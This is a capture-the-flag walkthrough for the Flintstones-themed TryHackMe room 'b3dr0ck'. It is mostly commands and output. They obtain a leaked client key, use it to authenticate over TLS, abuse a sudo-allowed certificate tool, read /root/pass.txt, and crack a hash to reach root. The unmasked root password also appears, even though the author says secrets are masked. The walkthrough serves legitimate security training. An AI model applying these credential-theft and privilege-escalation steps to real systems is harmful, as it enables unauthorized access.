# b3dr0ck

Server trouble in Bedrock.

Fred Flintstone   &   Barney Rubble!

Barney is setting up the ABC webserver, and trying to use certs to secure connections, but he's having trouble. Here's what we know...

    He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
    There is a socket listening with a simple service to help retrieve credential files (client key & certificate)
    There is another () helper service listening for authorized connections using files obtained from the above service
    Can you find all the Easter eggs?

Room: https://tryhackme.com/room/b3dr0ck

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/b3dr0ck.md

----------------------

## Overview

This room followed a fun Flintstones themed chain involving client certificates, a custom certificate utility, password hints, encoding layers, and finally cracking a hash to recover the root password.

The main path was:

```
Web clue on 4040
9009 leaked Barney certificate material
54321 accepted client certificate authentication
Barney password hint led to SSH access
Barney could run certutil as root
certutil generated Fred certificate material
Fred certificate gave Fred password hint
Fred could read encoded root password data
Decoding revealed an MD5 hash
hashes.com cracked the hash
su root
```

Flags and secrets are masked in this writeup.

## Enumeration

I started with a full port scan.

```
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt TARGET
```

Open ports found:

```
22      ssh
80      http
4040    ssl http
9009    custom service
54321   ssl custom service
```

Port 80 redirected to the HTTPS service on port 4040.

The site on port 4040 showed a small page for ABC, short for Abbadabba Broadcasting Compandy. The page mentioned Barney setting up nginx and Bamm Bamm trying to set up a SQL database. The important hint was that something was running from the toilet and was OVER 9000.

That pointed at the custom service on port 9009.

## Discovering the certificate service

Connecting to port 9009 with netcat showed an interactive prompt.

```
nc TARGET 9009
```

The service asked:

```
What are you looking for?
```

Asking for a certificate returned Barney’s certificate.

```
certificate
```

The service responded with a PEM certificate for Barney Rubble.

Asking for the private key also worked.

```
private
```

This returned Barney’s RSA private key.

I saved the certificate and key locally.

```
nano barney.crt
nano barney.key
chmod 600 barney.key
```

## Authenticating to the SSL hint service

The service on port 54321 rejected normal connections.

```
openssl s_client -connect TARGET:54321 -quiet
```

It returned:

```
Error: 'undefined' is not authorized for access.
```

This suggested the service required a client certificate.

Using Barney’s certificate and key worked.

```
openssl s_client -connect TARGET:54321 -cert barney.crt -key barney.key -quiet
```

The service accepted the certificate.

```
Welcome: 'Barney Rubble' is authorized.
b3dr0ck>
```

Running help gave a password hint.

```
help
```

The service returned an MD5 looking hash for Barney.

```
Password hint: d1ad7c0a3********0dab4180dd
```

This was used as Barney’s password hint. Once the password was recovered, SSH access worked.

```
ssh barney@TARGET
```

## Barney enumeration

After logging in as Barney, I checked sudo permissions.

```
sudo -l
```

Barney could run a custom certutil binary as root.

```
User barney may run the following commands on TARGET:
    /usr/bin/certutil
```

Checking the help showed that this was not the normal Linux NSS certutil. It was a custom room binary.

```
certutil -H
```

Output:

```
Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil username fullname
```

Listing the current certificates showed certificate material for both Barney and Fred.

```
certutil ls
```

The directory contained:

```
barney.certificate.pem
barney.clientKey.pem
barney.csr.pem
barney.serviceKey.pem
fred.certificate.pem
fred.clientKey.pem
fred.csr.pem
fred.serviceKey.pem
```

The files were owned by root, but since Barney could run certutil as root, this became the next escalation step.

## Generating Fred’s certificate as root

Using sudo, I generated a new certificate and keypair for Fred.

```
sudo certutil fred "Fred Flintstone"
```

The command printed Fred’s private key and certificate directly to the terminal.

I saved the private key and certificate.

```
cat > /tmp/fred.key
```

Paste the private key block, then press Ctrl D.

```
cat > /tmp/fred.crt
```

Paste the certificate block, then press Ctrl D.

Then I fixed the key permissions.

```
chmod 600 /tmp/fred.key
```

## Authenticating as Fred

Using Fred’s certificate and key against port 54321 worked.

```
openssl s_client -connect 127.0.0.1:54321 -cert /tmp/fred.crt -key /tmp/fred.key -quiet
```

The service accepted Fred.

```
Welcome: 'Fred Flintstone' is authorized.
b3dr0ck>
```

Running help gave Fred’s password hint.

```
help
```

The service returned:

```
Password hint: Yabba*******0000!
```

That was Fred’s SSH password.

I switched to Fred.

```
su - fred
```

## Fred sudo permissions

As Fred, I checked sudo permissions.

```
sudo -l
```

Fred could run base32 and base64 against root’s password file without a password.

```
User fred may run the following commands on TARGET:
    NOPASSWD: /usr/bin/base32 /root/pass.txt
    NOPASSWD: /usr/bin/base64 /root/pass.txt
```

I read the file through both allowed commands.

```
sudo /usr/bin/base64 /root/pass.txt
```

This returned Base64 encoded data.

```
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==
```

Reading it with base32 also returned encoded data.

```
sudo /usr/bin/base32 /root/pass.txt
```

This returned another encoded string.

The trick was that the password data needed multiple decoding layers.

The working order was:

```
base32
base32
base64
```

After decoding the layers, I got an MD5 hash.

```
a00a12aad6b7c16bf07032bd05a31d56
```

## Cracking the root password

I used hashes.com to crack the hash.

```
https://hashes.com/en/decrypt/hash
```

The hash cracked to:

```
flintstonesvitamins
```

This was the root password.

## Root

I switched to root.

```
su root
```

Password:

```
flintstones*******ns
```

Then I read the root flag.

```
cd /root
cat root.txt
```

Root flag:

```
THM{de4...1b7}
```

## Key Takeaways

This room chained several small weaknesses together:

1. A web hint pointed to the custom service on port 9009.
2. The 9009 service leaked client certificate material.
3. The 54321 service trusted certificate common names for authentication.
4. Barney had sudo access to a custom certutil tool.
5. That certutil tool could generate valid certificate material for Fred.
6. Fred had limited sudo access to encoded root password data.
7. The root password was recovered by decoding multiple layers and cracking the final MD5 hash.

## Final Attack Chain

```
nmap found 4040, 9009, and 54321
4040 gave the OVER 9000 clue
9009 leaked Barney cert and key
54321 accepted Barney client certificate
help gave Barney password hint
SSH as barney
sudo certutil generated Fred cert and key
54321 accepted Fred client certificate
help gave Fred password
su to fred
sudo base32 and base64 read /root/pass.txt
decode base32, base32, base64
crack MD5 with hashes.com
su root
read root.txt
```
